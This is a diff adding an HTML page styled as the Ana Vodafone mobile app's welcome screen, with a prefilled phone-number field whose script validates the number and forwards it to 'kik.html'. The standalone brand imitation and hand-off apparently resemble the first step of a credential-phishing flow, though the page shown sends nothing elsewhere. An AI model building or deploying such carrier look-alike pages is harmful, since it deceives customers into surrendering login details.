@@ -1,0 +1,293 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Ana Vodafone</title>
+<style>
+  :root{
+    --vf-red:#e60000;
+    --vf-red-dark:#c30000;
+    --bg-top:#f2f0f0;
+    --bg-bottom:#fbe3e3;
+    --text-dark:#1a1a1a;
+    --text-grey:#6b6b6b;
+    --card-white:#ffffff;
+  }
+  *{box-sizing:border-box;}
+  html,body{
+    height:100%;
+    margin:0;
+    padding-top:env(safe-area-inset-top,0px);
+    padding-bottom:env(safe-area-inset-bottom,0px);
+  }
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+    background:linear-gradient(180deg,var(--bg-top) 0%, var(--bg-top) 18%, var(--bg-bottom) 55%, var(--bg-bottom) 100%);
+    display:flex;
+    justify-content:center;
+  }
+  .phone{
+    width:100%;
+    max-width:430px;
+    min-height:100vh;
+    min-height:100dvh;
+    display:flex;
+    flex-direction:column;
+    position:relative;
+  }
+
+  .lang-row{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    padding:14px 20px 18px;
+    font-size:16px;
+    font-weight:600;
+    color:var(--text-dark);
+  }
+  .lang-row svg{flex-shrink:0;}
+
+  .bundle-banner{
+    margin:0 16px 18px;
+    background:var(--card-white);
+    border-radius:16px;
+    padding:14px 18px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    box-shadow:0 1px 3px rgba(0,0,0,.04);
+  }
+  .bundle-banner p{
+    margin:0;
+    font-size:14.5px;
+    color:var(--text-dark);
+    max-width:70%;
+    line-height:1.3;
+  }
+  .bundle-pill{
+    background:#fbd8d8;
+    border-radius:14px;
+    padding:6px 14px;
+    display:flex;
+    align-items:baseline;
+    gap:2px;
+    white-space:nowrap;
+  }
+  .bundle-pill .num{
+    color:var(--vf-red);
+    font-size:22px;
+    font-weight:800;
+  }
+  .bundle-pill .unit{
+    color:var(--vf-red);
+    font-size:11px;
+    font-weight:700;
+  }
+
+  .content{
+    flex:1;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    padding:0 24px;
+    text-align:center;
+  }
+  .content h1{
+    font-size:27px;
+    font-weight:800;
+    color:var(--text-dark);
+    margin:0 0 18px;
+    letter-spacing:-0.2px;
+  }
+  .content p.sub{
+    font-size:15px;
+    color:var(--text-grey);
+    line-height:1.5;
+    margin:0 0 36px;
+    padding:0 6px;
+  }
+
+  .field{
+    background:var(--card-white);
+    border-radius:16px;
+    padding:12px 18px 14px;
+    text-align:left;
+    margin-bottom:22px;
+    box-shadow:0 1px 3px rgba(0,0,0,.04);
+  }
+  .field label{
+    display:block;
+    font-size:12.5px;
+    color:var(--text-grey);
+    margin-bottom:4px;
+  }
+  .field .value{
+    font-size:18px;
+    color:var(--text-dark);
+    font-weight:500;
+  }
+
+  .btn-continue{
+    width:100%;
+    border:none;
+    border-radius:16px;
+    background:linear-gradient(180deg,#eb0000,#c40000);
+    color:#fff;
+    font-size:17px;
+    font-weight:700;
+    padding:17px 0;
+    cursor:pointer;
+    box-shadow:0 4px 10px rgba(198,0,0,.25);
+  }
+  .btn-continue:active{filter:brightness(0.95);}
+
+  .divider{
+    display:flex;
+    align-items:center;
+    gap:14px;
+    margin:28px 0 24px;
+    color:#8a8a8a;
+    font-size:13px;
+  }
+  .divider::before,.divider::after{
+    content:"";
+    flex:1;
+    height:1px;
+    background:#d9d3d3;
+  }
+
+  .add-number{
+    display:block;
+    color:var(--vf-red);
+    font-size:15.5px;
+    font-weight:600;
+    text-decoration:underline;
+    text-underline-offset:3px;
+  }
+
+  .bottom-nav{
+    background:var(--card-white);
+    border-top-left-radius:22px;
+    border-top-right-radius:22px;
+    display:flex;
+    justify-content:space-around;
+    padding:16px 10px calc(14px + env(safe-area-inset-bottom,0px));
+    box-shadow:0 -2px 10px rgba(0,0,0,.04);
+  }
+  .nav-item{
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    gap:6px;
+    color:#8a8a8a;
+    font-size:12.5px;
+  }
+  .nav-icon{
+    width:40px;
+    height:40px;
+    border-radius:50%;
+    background:#ececec;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+
+  @media (prefers-color-scheme: dark){
+    :root:not([data-theme="light"]){
+      --bg-top:#1c1414;
+      --bg-bottom:#2a1414;
+      --text-dark:#f2f2f2;
+      --text-grey:#b5aaaa;
+      --card-white:#2a2222;
+    }
+    .bundle-pill{background:#4a2020;}
+    .nav-icon{background:#3a3030;}
+    .divider::before,.divider::after{background:#4a3f3f;}
+  }
+</style>
+</head>
+<body>
+  <div class="phone">
+
+    <div class="lang-row">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3a14 14 0 010 18M12 3a14 14 0 000 18"/></svg>
+      <span>English</span>
+      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3"><path d="M6 9l6 6 6-6"/></svg>
+    </div>
+
+    <div class="bundle-banner">
+      <p>The app won't consume from your bundle</p>
+      <div class="bundle-pill"><span class="num">0</span><span class="unit">MB</span></div>
+    </div>
+
+    <div class="content">
+      <h1>Welcome to Ana Vodafone</h1>
+      <p class="sub">Stay in control of your line. Track usage, pay bills, manage subscriptions, and more all in one place</p>
+
+      <div class="field">
+        <label for="mobile">Mobile Number</label>
+        <input id="mobile" class="value" type="tel" value="01022544474" style="border:none;outline:none;width:100%;background:transparent;font:inherit;color:inherit;padding:0;">
+      </div>
+
+      <button class="btn-continue">Continue</button>
+
+      <div class="divider">OR</div>
+
+      <a href="#" class="add-number">Add another number</a>
+    </div>
+
+    <div class="bottom-nav">
+      <div class="nav-item">
+        <div class="nav-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"/><path d="M12 3a14 14 0 010 18M12 3a14 14 0 000 18M3 12h18"/></svg>
+        </div>
+        <span>Shop with us</span>
+      </div>
+      <div class="nav-item">
+        <div class="nav-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 4-6 8-6s8 2 8 6"/></svg>
+        </div>
+        <span>login</span>
+      </div>
+      <div class="nav-item">
+        <div class="nav-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 10.5c0 6-9 11-9 11s-9-5-9-11a9 9 0 0118 0z"/><circle cx="12" cy="10.5" r="2.5"/></svg>
+        </div>
+        <span>store locator</span>
+      </div>
+      <div class="nav-item">
+        <div class="nav-icon">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="9"/><path d="M8 8l5 2.5L10.5 16 8 8z"/></svg>
+        </div>
+        <span>Explore</span>
+      </div>
+    </div>
+
+  </div>
+  <script>
+    const mobileInput = document.getElementById('mobile');
+    const continueBtn = document.querySelector('.btn-continue');
+
+    const normalizePhone = (value) => value.replace(/\D/g, '').replace(/^243/, '');
+    const isValidPhone = (value) => /^(?:0\d{9,10}|9\d{8,9}|\d{9,11})$/.test(value);
+
+    mobileInput.addEventListener('input', () => {
+      mobileInput.value = normalizePhone(mobileInput.value);
+    });
+
+    continueBtn.addEventListener('click', () => {
+      const phone = normalizePhone(mobileInput.value.trim());
+      if (!isValidPhone(phone)) {
+        alert('Please enter a valid mobile number.');
+        mobileInput.focus();
+        return;
+      }
+
+      const params = new URLSearchParams(window.location.search);
+      params.set('phone', phone);
+      window.location.href = 'kik.html?' + params.toString();
+    });
+  </script>
+</body>
+</html>
